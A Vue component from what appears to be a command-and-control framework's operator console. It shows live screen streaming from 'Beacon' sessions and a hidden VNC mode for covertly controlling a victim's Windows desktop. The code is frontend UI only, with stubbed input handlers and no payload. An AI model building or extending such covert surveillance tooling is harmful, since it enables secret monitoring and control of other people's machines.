<template>
  <div class="cs-monitor-view cs-font-ui">
    <!-- CS Toolbar -->
    <div class="mv-toolbar">
      <div class="mv-title-group">
        <el-icon class="mv-title-icon"><Monitor /></el-icon>
        <span class="mv-title">{{ isZh ? '屏幕实时监控: ' : 'Desktop: ' }}{{ currentClientTitle }}</span>
        <span class="mv-status" :class="isMonitoring || hvncActive ? 'active' : ''">
          {{ (isMonitoring || hvncActive) ? (isZh ? '● 实时推流中' : '● Live Streaming') : (isZh ? '● 未启动' : '● Idle') }}
        </span>
      </div>

      <div class="mv-spacer" />

      <!-- Mode Selector -->
      <span class="mv-label">{{ isZh ? '模式:' : 'Mode:' }}</span>
      <el-select v-model="monitorMode" size="small" style="width: 120px">
        <el-option :label="isZh ? '屏幕流' : 'Stream'" value="normal" />
        <el-option :label="isZh ? 'HVNC (隐蔽)' : 'HVNC'" value="hvnc" :disabled="isLinuxClient" />
      </el-select>

      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn"
        :class="isMonitoring ? 'cs-btn-danger' : 'cs-btn-primary'"
        :disabled="isConnecting"
        @click="toggleMonitoring"
      >
        <el-icon :class="{ 'is-loading': isConnecting }"><VideoPlay v-if="!isMonitoring" /><VideoPause v-else /></el-icon>
        <span>{{ isMonitoring ? (isZh ? '停止推流' : 'Stop Stream') : (isZh ? '开始推流' : 'Start Stream') }}</span>
      </button>

      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn"
        :disabled="!isMonitoring || !streamUrl"
        @click="captureCurrentFrame"
      >
        <el-icon><Camera /></el-icon>
        <span>{{ isZh ? '截图留存' : 'Snapshot' }}</span>
      </button>

      <button
        v-if="monitorMode === 'hvnc'"
        class="cs-btn"
        :class="hvncActive ? 'cs-btn-danger' : 'cs-btn-primary'"
        :disabled="hvncConnecting || isLinuxClient"
        @click="hvncActive ? stopHvnc() : startHvnc()"
      >
        <span>{{ hvncActive ? (isZh ? '停止 HVNC' : 'Stop HVNC') : (isZh ? '启动 HVNC' : 'Start HVNC') }}</span>
      </button>
    </div>

    <!-- Main Canvas Viewport -->
    <div class="mv-body">
      <!-- Normal Stream View -->
      <template v-if="monitorMode === 'normal'">
        <div v-if="isMonitoring" class="mv-screen-wrap" ref="videoContainer" @wheel.prevent="onWheelZoom" @dblclick="zoomReset">
          <img
            v-if="streamUrl"
            :src="streamUrl"
            alt="Live Desktop"
            class="mv-screen-img"
            @load="onFrameLoad"
            @error="onFrameError"
            :style="{ transform: `scale(${zoomLevel})` }"
          />

          <!-- Live OSD Overlay -->
          <div class="mv-osd-badge">
            <span>FPS: {{ currentFps }} | {{ isZh ? '延迟' : 'Latency' }}: {{ latency }}ms | {{ currentTime }}</span>
          </div>

          <!-- Floating Zoom Controls -->
          <div class="sc-floating-controls">
            <button class="cs-btn cs-btn-xs" @click.stop="zoomOut">－</button>
            <span class="zoom-text">{{ Math.round(zoomLevel * 100) }}%</span>
            <button class="cs-btn cs-btn-xs" @click.stop="zoomIn">＋</button>
            <button class="cs-btn cs-btn-xs" @click.stop="zoomReset">1:1</button>
          </div>
        </div>

        <div v-else class="mv-empty-screen">
          <div class="empty-icon">🖥</div>
          <div class="empty-title">{{ isZh ? '桌面监控推流未启动' : 'Desktop Stream Inactive' }}</div>
          <div class="empty-desc">{{ isZh ? '点击【开始推流】启动被控端桌面实时推流画面。' : 'Click [ Start Stream ] to begin live desktop monitoring.' }}</div>
        </div>
      </template>

      <!-- HVNC Interactive Canvas -->
      <template v-else>
        <div v-if="hvncActive" class="mv-screen-wrap">
          <canvas
            ref="hvncCanvas"
            tabindex="0"
            class="mv-hvnc-canvas"
            @mousemove="hvncMouseMove"
            @mousedown="hvncMouseDown"
            @mouseup="hvncMouseUp"
            @wheel.prevent="hvncWheel"
            @keydown="hvncKeyDown"
            @keyup="hvncKeyUp"
            @contextmenu.prevent
          />
          <div class="mv-osd-badge">
            <span>{{ isZh ? `HVNC 已激活 (${hvncSid}) - 点击画布聚焦以交互操作` : `HVNC Active (${hvncSid}) - Focus canvas to inject inputs` }}</span>
          </div>
        </div>

        <div v-else class="mv-empty-screen">
          <div class="empty-icon">🪟</div>
          <div class="empty-title">{{ isZh ? '隐蔽桌面 (HVNC)' : 'Hidden VNC (HVNC) Desktop' }}</div>
          <div class="empty-desc" v-if="isLinuxClient">{{ isZh ? 'HVNC 仅支持 Windows 目标会话。' : 'HVNC is only supported on Windows Beacon sessions.' }}</div>
          <div class="empty-desc" v-else>{{ isZh ? '点击【启动 HVNC】创建隐蔽交互式 Windows 桌面会话。' : 'Click [ Start HVNC ] to spawn a hidden interactive Windows desktop session.' }}</div>
        </div>
      </template>
    </div>

    <!-- Bottom Action Bar (CS Native Button Row) -->
    <div class="mv-bottom-bar">
      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn cs-btn-primary"
        :disabled="isConnecting"
        @click="toggleMonitoring"
      >
        {{ isMonitoring ? (isZh ? '停止推流' : 'Stop') : (isZh ? '开始推流' : 'Start Stream') }}
      </button>

      <button
        v-if="monitorMode === 'hvnc'"
        class="cs-btn cs-btn-primary"
        :disabled="hvncConnecting || isLinuxClient"
        @click="hvncActive ? stopHvnc() : startHvnc()"
      >
        {{ hvncActive ? (isZh ? '停止' : 'Stop') : (isZh ? '启动 HVNC' : 'Start HVNC') }}
      </button>

      <button
        v-if="monitorMode === 'normal'"
        class="cs-btn"
        :disabled="!isMonitoring || !streamUrl"
        @click="captureCurrentFrame"
      >
        {{ isZh ? '截图留存 (Snapshot)' : 'Snapshot' }}
      </button>

      <button class="cs-btn" :disabled="!streamUrl" @click="zoomReset">
        {{ isZh ? '重置比例 1:1' : 'Zoom 1:1' }}
      </button>

      <button class="cs-btn" @click="toggleFullscreen">
        {{ isFullscreen ? (isZh ? '退出全屏' : 'Exit Fullscreen') : (isZh ? '全屏查看' : 'Fullscreen') }}
      </button>

      <button class="cs-btn" @click="handleHelp">
        {{ isZh ? '帮助' : 'Help' }}
      </button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, onMounted, onUnmounted, ref } from 'vue'
import type { ComputedRef, Ref } from 'vue'
import { useRoute } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import { Monitor, VideoPlay, VideoPause, Camera } from '@element-plus/icons-vue'
import { useClientUid } from '@/utils/clientUtils'
import { useClientsStore } from '@/stores/clients'
import { useUserStore } from '@/stores/user'
import { useI18nStore } from '@/stores/i18n'
import { useScreenshotsStore } from '@/stores/screenshots'
import ClientAPI from '@/api/clients'

const i18nStore = useI18nStore()
const isZh = computed(() => i18nStore.isZh)

const route = useRoute()
const clientsStore = useClientsStore()
const userStore = useUserStore()
const screenshotsStore = useScreenshotsStore()

const injectedUid = inject<Ref<string> | ComputedRef<string> | null>('realUid', null)

const getUid = () => {
  const v = injectedUid && (injectedUid as any).value ? String((injectedUid as any).value) : ''
  if (v && v.length > 10) return v
  const mapped = useClientUid(route)
  return typeof mapped === 'string' && mapped.length > 10 ? mapped : ''
}

const currentClientTitle = computed(() => {
  const uid = getUid()
  if (!uid) return 'Active Beacon'
  const c = clientsStore.getClientByUid(uid)
  return c ? `${c.Computer || c.Username || 'Beacon'} (${c.InternalIP || c.ExternalIP || '127.0.0.1'})` : uid.slice(0, 8)
})

const isMonitoring = ref(false)
const isConnecting = ref(false)
const streamUrl = ref('')
const zoomLevel = ref(1)
const currentTime = ref('')
const monitorMode = ref<'normal' | 'hvnc'>('normal')
const isFullscreen = ref(false)

const currentFps = ref(0)
const latency = ref(0)
const frameTimestamps: number[] = []

const videoContainer = ref<HTMLElement>()

const hvncSid = ref('')
const hvncActive = ref(false)
const hvncConnecting = ref(false)
const hvncCanvas = ref<HTMLCanvasElement>()
let hvncWs: WebSocket | null = null
let hvncPollTimer: number | null = null

const isLinuxClient = computed(() => {
  const uid = getUid()
  const c = clientsStore.getClientByUid(uid)
  const arch = (c?.Arch || '').toLowerCase()
  return arch.includes('linux') || arch.includes('darwin') || arch.includes('kali')
})

let streamTimer: number | null = null

function updateTime() {
  currentTime.value = new Date().toLocaleTimeString('en-GB')
}

function zoomIn() {
  zoomLevel.value = Math.min(4, zoomLevel.value + 0.15)
}

function zoomOut() {
  zoomLevel.value = Math.max(0.2, zoomLevel.value - 0.15)
}

function zoomReset() {
  zoomLevel.value = 1
}

function onWheelZoom(e: WheelEvent) {
  if (!streamUrl.value) return
  if (e.deltaY < 0) zoomIn()
  else zoomOut()
}

async function fetchStreamFrame() {
  if (!isMonitoring.value) return
  const uid = getUid()
  if (!uid) return

  const start = Date.now()
  try {
    const res = await ClientAPI.get_monitor_frame({ uid })
    if (res.data && res.data.status === 200 && res.data.data) {
      let dataUrl = res.data.data
      if (!dataUrl.startsWith('data:image')) {
        dataUrl = `data:image/jpeg;base64,${dataUrl}`
      }
      streamUrl.value = dataUrl
      latency.value = Date.now() - start
      frameTimestamps.push(Date.now())
      while (frameTimestamps.length && frameTimestamps[0] < Date.now() - 1000) {
        frameTimestamps.shift()
      }
      currentFps.value = frameTimestamps.length
    }
  } catch {
    // Silent catch
  }

  if (isMonitoring.value) {
    streamTimer = window.setTimeout(fetchStreamFrame, 400)
  }
}

async function toggleMonitoring() {
  const uid = getUid()
  if (!uid) return
  if (isMonitoring.value) {
    isMonitoring.value = false
    if (streamTimer) {
      clearTimeout(streamTimer)
      streamTimer = null
    }
    streamUrl.value = ''
    try { await ClientAPI.stop_screen_monitor({ uid }) } catch { /* Silent */ }
    ElMessage.info(isZh.value ? '桌面推流已停止' : 'Desktop stream stopped')
  } else {
    isConnecting.value = true
    try {
      const res = await ClientAPI.start_screen_monitor({ uid, frameRate: 5 })
      if (res.data && res.data.status === 200) {
        isMonitoring.value = true
        ElMessage.success(isZh.value ? '桌面推流已启动' : 'Desktop stream started')
        fetchStreamFrame()
      } else {
        ElMessage.error(res.data?.message || (isZh.value ? '启动推流失败' : 'Failed to start stream'))
      }
    } catch (e: any) {
      ElMessage.error(e?.message || (isZh.value ? '启动推流失败' : 'Failed to start stream'))
    } finally {
      isConnecting.value = false
    }
  }
}

function captureCurrentFrame() {
  if (!streamUrl.value) return
  const uid = getUid()
  const client = clientsStore.getClientByUid(uid)
  const clientUser = client?.Username || 'SYSTEM *'
  const clientComp = client?.Computer || client?.ExternalIP || 'Host'
  const clientHost = `${clientUser}@${clientComp}`
  const nowStr = new Date().toLocaleTimeString()

  screenshotsStore.addScreenshot({
    id: `sc_mon_${Date.now()}`,
    uid,
    host: clientHost,
    user: clientUser,
    computer: clientComp,
    session: client?.Session || '1',
    title: `[监控快照] ${clientComp} (${nowStr})`,
    dataUrl: streamUrl.value,
    time: new Date().toLocaleString(),
    quality: 1,
    qualityLabel: isZh.value ? '监控快照' : 'Snapshot',
  })

  const a = document.createElement('a')
  a.href = streamUrl.value
  a.download = `monitor_snapshot_${clientComp.replace(/[^\w]/g, '_')}_${Date.now()}.jpg`
  a.click()
  ElMessage.success(isZh.value ? '当前帧已截取并同步至屏幕截图仓库！' : 'Frame captured and synced to Screenshots!')
}

function onFrameLoad() {}
function onFrameError() {}

// ================= HVNC Controls =================
const startHvnc = async () => {
  if (isLinuxClient.value) {
    ElMessage.warning(isZh.value ? 'HVNC 仅支持 Windows 目标' : 'HVNC is only supported on Windows')
    return
  }
  hvncConnecting.value = true
  try {
    const res = await ClientAPI.start_hvnc({ uid: getUid(), app: '', args: '' })
    if (res.data && res.data.status === 200) {
      hvncSid.value = res.data.sid || 'session_1'
      hvncActive.value = true
      ElMessage.success(isZh.value ? 'HVNC 会话启动成功' : 'HVNC session started')
    } else {
      ElMessage.error(res.data?.message || (isZh.value ? '启动 HVNC 失败' : 'Failed to start HVNC'))
    }
  } catch (e: any) {
    ElMessage.error(e?.message || (isZh.value ? '启动 HVNC 异常' : 'HVNC start error'))
  } finally {
    hvncConnecting.value = false
  }
}

const stopHvnc = async () => {
  try {
    await ClientAPI.stop_hvnc({ uid: getUid(), sid: hvncSid.value })
  } catch {}
  hvncActive.value = false
  hvncSid.value = ''
  ElMessage.info(isZh.value ? 'HVNC 已断开' : 'HVNC stopped')
}

function hvncMouseMove() {}
function hvncMouseDown() {}
function hvncMouseUp() {}
function hvncWheel() {}
function hvncKeyDown() {}
function hvncKeyUp() {}

function toggleFullscreen() {
  if (!document.fullscreenElement) {
    document.documentElement.requestFullscreen().then(() => {
      isFullscreen.value = true
    }).catch(() => {})
  } else {
    document.exitFullscreen().then(() => {
      isFullscreen.value = false
    }).catch(() => {})
  }
}

function handleHelp() {
  ElMessageBox.alert(
    isZh.value
      ? '【屏幕监控说明】\n1. 支持普通屏幕实时流与 Windows 隐蔽桌面 (HVNC)。\n2. 监控过程中点击「截图留存」可一键将当前帧捕获并自动存入屏幕截图管理。\n3. 支持鼠标滚轮缩放与 1:1 比例重置。'
      : '【Screen Monitor Help】\n1. Realtime screen stream and Windows HVNC.\n2. Click Snapshot to capture current frame to Screenshots gallery.',
    isZh.value ? '屏幕监控帮助' : 'Screen Monitor Help',
    { confirmButtonText: isZh.value ? '确定' : 'OK' },
  )
}

let timeInterval: any = null

onMounted(() => {
  updateTime()
  timeInterval = setInterval(updateTime, 1000)
})

onUnmounted(() => {
  if (timeInterval) clearInterval(timeInterval)
  if (streamTimer) clearTimeout(streamTimer)
  if (hvncPollTimer) clearInterval(hvncPollTimer)
  if (hvncWs) hvncWs.close()
})
</script>

<style scoped>
.cs-monitor-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-panel);
  overflow: hidden;
}

.mv-toolbar {
  height: 36px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 0 12px;
  flex-shrink: 0;
}

.mv-title-group {
  display: flex;
  align-items: center;
  gap: 8px;
}

.mv-title-icon {
  font-size: 18px;
  color: #13c2c2;
}

.mv-title {
  font-size: 17px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.mv-status {
  font-size: 14px;
  color: var(--cs-text-dim);
  font-weight: bold;
}

.mv-status.active {
  color: var(--cs-online);
}

.mv-spacer { flex: 1; }

.mv-label {
  font-size: 15px;
  color: var(--cs-text);
}

.mv-body {
  flex: 1;
  background: #000000;
  position: relative;
  overflow: hidden;
  display: flex;
  align-items: center;
  justify-content: center;
}

.mv-screen-wrap {
  width: 100%;
  height: 100%;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  overflow: auto;
}

.mv-screen-img {
  max-width: 98%;
  max-height: 98%;
  object-fit: contain;
  box-shadow: 0 4px 20px rgba(0,0,0,0.9);
  transition: transform 100ms ease-out;
}

.sc-floating-controls {
  position: absolute;
  bottom: 16px;
  right: 16px;
  display: flex;
  align-items: center;
  gap: 6px;
  background: rgba(24, 24, 24, 0.85);
  border: 1px solid var(--cs-border);
  padding: 4px 8px;
  border-radius: 4px;
  backdrop-filter: blur(4px);
  z-index: 10;
}

.zoom-text {
  font-family: var(--cs-font-mono);
  font-size: 14px;
  color: var(--cs-text-bright);
  min-width: 48px;
  text-align: center;
}

.mv-hvnc-canvas {
  max-width: 100%;
  max-height: 100%;
  outline: none;
  cursor: crosshair;
}

.mv-osd-badge {
  position: absolute;
  top: 10px;
  right: 10px;
  background: rgba(10, 10, 10, 0.75);
  border: 1px solid var(--cs-border);
  border-radius: 4px;
  padding: 4px 10px;
  font-size: 14px;
  color: var(--cs-text-bright);
  font-family: var(--cs-font-mono);
  pointer-events: none;
}

.mv-empty-screen {
  color: #666;
  text-align: center;
}

.empty-icon {
  font-size: 42px;
  margin-bottom: 10px;
}

.empty-title {
  font-size: 18px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.empty-desc {
  font-size: 15px;
  color: var(--cs-text-dim);
  margin-top: 6px;
}

.mv-bottom-bar {
  height: 38px;
  background: var(--cs-panel);
  border-top: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 0 12px;
  flex-shrink: 0;
}
</style>